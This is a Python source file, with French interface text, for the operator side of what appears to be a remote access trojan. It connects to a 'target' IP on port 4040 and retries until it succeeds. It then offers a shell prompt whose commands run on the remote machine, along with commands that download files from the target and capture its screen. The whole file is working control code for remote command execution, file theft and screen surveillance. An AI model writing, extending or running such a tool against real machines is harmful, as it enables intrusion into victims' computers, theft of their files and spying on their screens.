import time

from base import *
from commande_spliter import commande_spliter

ENCODING = 'utf-8'


class ClientSocket(BaseSocket):

    PORT = 4040

    def __init__(self):
        super().__init__()
        self.clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.targetaddress = (None, None)

    def connect(self, ip: str, port: int = PORT):
        i = 1
        while True:
            print(f'{WHITE}📡 Connexion au cible {YELLOW}{ip}:{port} 📡')
            try:
                self.clientsocket.connect((ip, port))
            except ConnectionRefusedError:
                print(f'{RED}❌ Erreur de connexion! ❌')
                i += 1
                print(f'{WHITE}🔁 Nouvelle tentative| {YELLOW}{ip}:{port} | {WHITE}{i} 🔁')
                time.sleep(5)
            else:
                print(f'\n{GREEN}✅ Connexion etablie avec succes 🛜\n')
                self.targetaddress = ip, port
                self.connected = True
                break

    def write_file_localy(self, commande, binary_file, destination):
        split_commande = commande.split(' ')
        error = False

        if destination.lower() == 'q':
            print(f"{RED}‼️Le fichier n'a pas ete telecharger.")
        try:
            file = open(destination, 'r')
        except FileNotFoundError:
            with open(destination, 'wb') as f:
                f.write(binary_file)
            print(f'{WHITE}Telechargement de {PURPLE}{split_commande[1]}{WHITE} dans {PURPLE}{destination}')
        except IsADirectoryError:
            print(f"{RED}‼️ {destination} est un dossier.")
            error = True
        else:
            file.close()
            print(f'{RED}‼️ Le fichier {destination} existe dejas')
            error = True

        if error:
            new_destination = input(f'{WHITE}Entrez un nouvelle destination (ou "q" pour quitter): {CYAN}')
            self.write_file_localy(commande, binary_file, new_destination)

    def run(self):
        while True:
            self.send_header_data('info'.encode(encoding=ENCODING))
            cwd = self.recv_header_data().decode(encoding=ENCODING)
            prompt = (f'{WHITE}╭─ {BLUE}{self.targetaddress[0]}:{self.targetaddress[1]} {WHITE}{cwd}'
                      f'\n{WHITE}╰─{YELLOW}❯ {CYAN}')

            commande = ''
            while commande == '':
                commande = input(prompt)
            if commande.lower() == 'exit':
                self.send_header_data(commande.encode(encoding=ENCODING))
                break

            splited_commande = commande_spliter(commande)
            self.send_header_data(commande.encode(encoding=ENCODING))
            output = self.recv_header_data(True)

            if not output:
                break

            elif len(splited_commande) == 3 and splited_commande[0] == 'dl':
                try:
                    if output.decode(encoding=ENCODING) == 'filenotfound':
                        print(f"{RED}‼️ Le fichier n'existe pas.")
                    elif output.decode(encoding=ENCODING) == 'isdir':
                        print(f"{RED}‼️ Ne peut pas telecharger un dossier.")
                    else:
                        self.write_file_localy(commande, output, splited_commande[2])
                except UnicodeDecodeError:
                    self.write_file_localy(commande, output, splited_commande[2])

            elif len(splited_commande) == 2 and splited_commande[0] == 'capture':
                try:
                    if output.decode(encoding=ENCODING) == 'error':
                        print(f'{RED}‼️ Impossibe d\'effectuer une capture d\'ecran.')
                    else:
                        with open(splited_commande[1] + '.png', 'wb') as img:
                            img.write(output)
                except UnicodeDecodeError:
                    with open(splited_commande[1] + '.png', 'wb') as img:
                        img.write(output)

            else:
                print(WHITE + output.decode(encoding=ENCODING))

        print(f'\n{GREEN}‼️ Deconnecte\n')
        self.clientsocket.close()


if __name__ == '__main__':
    client = ClientSocket()
    target_ip = input('Entrez l\'addresse IP du cible: ')
    client.connect(target_ip)
    client.run()
